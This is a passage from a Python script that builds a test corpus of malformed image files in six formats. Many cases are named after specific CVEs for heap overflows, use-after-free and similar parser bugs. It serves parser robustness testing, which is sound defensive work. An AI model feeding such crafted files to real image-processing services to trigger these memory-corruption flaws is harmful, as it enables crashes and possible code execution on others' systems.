        ('put_pixels_oob', 'CVE-2018-19664'),
    ]),
    'png': (PngGenerator, '.png', [
        ('empty', None),
        ('truncated', None),
        ('signature_only', None),
        ('bad_ihdr_crc', None),
        ('zero_dimensions', None),
        ('huge_dimensions', None),
        ('garbage_appended', None),
        ('garbage_prepended', None),
        ('wrong_chunk_type', None),
        ('no_ihdr', None),
        ('duplicate_ihdr', None),
        ('negative_dimensions', 'CVE-2020-27814'),
        ('oversized_chunk_length', 'CVE-2021-20254'),
        ('idat_with_garbage', None),
        ('plte_after_idat', None),
        ('multiple_iend', None),
        ('missing_iend', None),
        ('chrm_bad_length', None),
        ('ztxt_null_keyword', None),
        ('phys_zero_dpi', 'CVE-2022-30699'),
        ('splt_double_free', 'CVE-2015-7700'),
        ('pngcrush_unusual_chunks', 'CVE-2019-12971'),
        ('pngquant_integer_overflow', 'CVE-2016-5735'),
        ('optipng_heap_oob', 'CVE-2017-16938'),
        ('optipng_use_after_free', 'CVE-2015-7801'),
        ('optipng_reduce_uaf', 'CVE-2012-4432'),
    ]),
    'gif': (GifGenerator, '.gif', [
        ('empty', None),
        ('truncated', None),
        ('garbage_only', None),
        ('bad_header', None),
        ('zero_dimensions', None),
        ('huge_dimensions', None),
        ('missing_color_table', 'CVE-2020-19247'),
        ('bad_extension_length', None),
        ('bad_gce_disposal', None),
        ('bad_app_extension', None),
        ('image_without_descriptor', None),
        ('lzw_large_min_code', 'CVE-2023-43913'),
        ('gifsicle_null_deref', 'CVE-2020-19752'),
        ('gifsicle_fpe', 'CVE-2023-46009'),
        ('gifsicle_heap_oob', 'CVE-2023-36193'),
        ('giftrans_stack_oob', 'CVE-2021-45972'),
        ('rust_gif_oob_read', 'CVE-2019-20922'),
        ('gifsicle_uaf', 'CVE-2017-1000421'),
        ('gifsicle_double_free', 'CVE-2017-18120'),
    ]),
    'webp': (WebpGenerator, '.webp', [
        ('empty', None),
        ('truncated', None),
        ('garbage_only', None),
        ('bad_riff_size', None),
        ('bad_fourcc', None),
        ('vp8_bad_dims', 'CVE-2023-4863'),
        ('vp8l_bad_huffman', 'CVE-2023-4863'),
        ('vp8x_bad_flags', None),
        ('anim_bad_timing', None),
        ('alph_wrong_size', None),
        ('lossy_corrupt_partition', None),
        ('iccp_bad_profile', None),
    ]),
    'avif': (AvifGenerator, '.avif', [
        ('empty', None),
        ('truncated', None),
        ('garbage_only', None),
        ('bad_ftyp_brand', None),
        ('missing_mdat', None),
        ('zero_dimensions', None),
        ('huge_dimensions', None),
        ('wrong_profile', None),
        ('truncated_av1_obu', None),
        ('grid_tile_oob', 'CVE-2026-32740'),
    ]),
    'jp2': (Jp2Generator, '.jp2', [
        ('empty', None),
        ('truncated', None),
        ('garbage_only', None),
        ('bad_sig', None),
        ('bad_ftyp', None),
        ('zero_dimensions', None),
        ('huge_dimensions', None),
        ('missing_codestream', None),
        ('truncated_codestream', None),
        ('bad_siz_rsiz', None),
        ('qcd_missing', None),
        ('corrupted_packet', None),
        ('openjpeg_oob_siz', 'CVE-2025-54874'),
        ('plte_missing_colr', 'CVE-2016-7445'),
        ('icc_bad_profile', 'CVE-2013-4289'),
        ('tile_size_oob', 'CVE-2016-5152'),
        ('dwt_interleave_oob', 'CVE-2016-5157'),
        ('mcc_oob_write', 'CVE-2016-8332'),
        ('sycc420_to_rgb_oob', 'CVE-2021-3575'),
    ]),
}


def _build_filename(index, name, cve, ext):
    display_name = name.replace('_', '-')
    cve_part = f'-{cve.lower()}' if cve else ''
    return f'{index:03d}-{display_name}{cve_part}{ext}'


def main():
    parser = argparse.ArgumentParser(
        description='Generate a corpus of badly structured images for testing.')
    parser.add_argument('--out', default='corpus',
                        help='Output directory (default: corpus)')
    parser.add_argument('--seed', type=int, default=42,
                        help='RNG seed for deterministic output (default: 42)')
    parser.add_argument('--formats', default='jpeg,png,gif,webp,avif,jp2',
                        help='Comma-separated list of formats (default: all)')
    args = parser.parse_args()

    rng = random.Random(args.seed)
    selected = {f.strip() for f in args.formats.split(',') if f.strip()}

    total_count = 0

    for fmt, (gen_cls, ext, methods) in _GENERATORS.items():
        if fmt not in selected:
            continue

        fmt_dir = os.path.join(args.out, fmt)
        _ensure_dir(fmt_dir)
        gen = gen_cls(rng)

        count = 0
        for i, (name, cve) in enumerate(methods):
            try:
                data = getattr(gen, name)()
            except Exception as e:
                print(f'  [{fmt}] ERROR {name}: {e}')
                continue

            filename = _build_filename(i, name, cve, ext)
            path = os.path.join(fmt_dir, filename)
            with open(path, 'wb') as f:
                f.write(data)
            count += 1

        print(f'{fmt}: {count}/{len(methods)} generated')
        total_count += count

    # Format confusion
    if 'confusion' in selected or True:  # always generate
        confusion_dir = os.path.join(args.out, 'confusion')
        generate_format_confusion(confusion_dir, rng)
        print(f'confusion: 8 generated')

    print(f'\nTotal: {total_count} files (+ 8 format confusion)')


if __name__ == '__main__':
    main()
